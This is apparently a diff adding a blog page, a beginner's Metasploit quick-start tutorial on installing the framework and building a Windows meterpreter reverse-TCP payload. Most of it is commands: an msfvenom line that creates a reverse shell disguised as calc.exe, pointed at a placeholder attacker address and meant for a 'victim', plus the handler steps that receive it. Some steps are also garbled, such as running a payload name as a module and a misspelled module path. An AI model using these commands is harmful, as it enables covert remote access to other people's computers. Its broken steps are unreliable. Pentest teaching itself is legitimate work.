@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="generator" content="Pelican" />
+        <title>"metasploit"</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="A Pelican Blog Atom Feed" />
+        <meta name="description" content="- "blog-posts" Metasploit Beginner Quick Start This article is for beginner pentesters who are struggling in getting their own Metasploit..." />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">A Pelican Blog</a></h1>
+                <nav><ul>
+                    <li class="active"><a href="/category/content.html">content</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/metasploit.html" rel="bookmark"
+           title="Permalink to "metasploit"">"metasploit"</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2020-09-07T00:00:00+00:00">
+                Published: Mon 07 September 2020
+        </abbr>
+
+<p>In <a href="/category/content.html">content</a>.</p>
+
+</footer><!-- /.post-info -->      <h2>- "blog-posts"</h2>
+<h1>Metasploit Beginner Quick Start</h1>
+<p>This article is for beginner pentesters who are struggling in getting their own <code>Metasploit</code> installation up and running. Also I realized some struggle when it comes to generating the payload or executing the exploit. This article will touch on the basics of working payload generation.</p>
+<p>This article was written for <code>Ubuntu 18.04.4 LTS</code> VPS (Virtual Private Server) running on DigitalOcean. Writer picked 4GB RAM with 80GB disk space which costs about USD 20 per month. Following guide in this article should apply to other debian derivatives as well.</p>
+<p>Once you are ready with your Debian/Ubuntu installation, execute following command:</p>
+<ul>
+<li><code>#apt -y update &amp;&amp; apt -y upgrade</code></li>
+</ul>
+<p>Above step will ensure you have updated installation.</p>
+<h2>Metasploit Installation</h2>
+<p>Download <code>Metasploit</code> installer by running the following command:</p>
+<ul>
+<li><code>#curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</code></li>
+</ul>
+<p>Give the <code>msfinstall</code> file executable permission and execute the file by running following command from the directory where you have downloaded the installer file: -<code>#./msfinstall</code></p>
+<p>Once you have done above step, now you need to initialize the database that will be used by <code>Metasploit</code> by running following command as non-root user: -<code>msfdb init</code></p>
+<h2>Metasploit Examples</h2>
+<p>In this example, we are going to create a windows meterpreter reverse tcp payload and give it to our victim.</p>
+<p>To generate the payload, you need to run following command:</p>
+<ul>
+<li><code>#msfvenom -p windows/meterpreter_reverse_tcp LHOST=&lt;ATTACKER_IP_ADDR&gt; LPORT=&lt;ATTACKER_PORT&gt; -f exe &gt; calc.exe</code></li>
+</ul>
+<p>Then on a separate terminal, launch <code>msfconsole</code> and enter following commands:</p>
+<ul>
+<li><code>msf5 &gt; use window/meterpreter_reverse_tcp</code></li>
+<li><code>msf 5 &gt; set LHOST &lt;ATTACKER_IP_ADDR&gt;</code></li>
+<li><code>msf 5 &gt; set LPORT &lt;ATTACKER_PORT&gt;</code></li>
+<li><code>msf 5 &gt; run</code></li>
+</ul>
+<p>Aforementioned commands, when followed step-by-step will generate a payload for you in the host. Now transfer the file to your own machine and run following commands step-by-step:</p>
+<ul>
+<li><code>#msfconsole</code></li>
+<li><code>msf 5 &gt;use exploit/multi/handler</code></li>
+<li><code>msf 5 &gt;set PAYLOAD windows/meterpreter_reverse_tcp</code> - this you will follow what is set during <code>msfvenom</code> payload generation command</li>
+<li><code>msf 5 &gt;set LHOST &lt;ATTACKER_IP_ADDR&gt;</code></li>
+<li><code>msf 5 &gt; set LPORT &lt;ATTACKER_PORT&gt;</code></li>
+<li><code>msf 5 &gt;exploit</code></li>
+</ul>
+<p>Now the meterpreter will listen for any incoming connection. Go ahead and run the file that has been generated in victim or your own computer and you should see the connection being made.</p>
+<h2>Conclusion</h2>
+<p>Metasploit is a powerful tool. You can use it to generate state-of-the-art payloads and stagers that can avoid anti-virus detection. It also has exploit session where you can use exploit for vulnerable software. For example, there is a exploit for mkv files for VLC player version 2.2.8. So you can install the vulnerable VLC player and try out the exploit yourself. Exploit generation is somewhat similar. If you get stuck, use <code>show options</code> and <code>help</code> to show what commands or options available to you.</p>
+<blockquote>
+<p>Written with <a href="https://stackedit.io/">StackEdit</a>.</p>
+</blockquote>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a href="https://www.python.org/">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
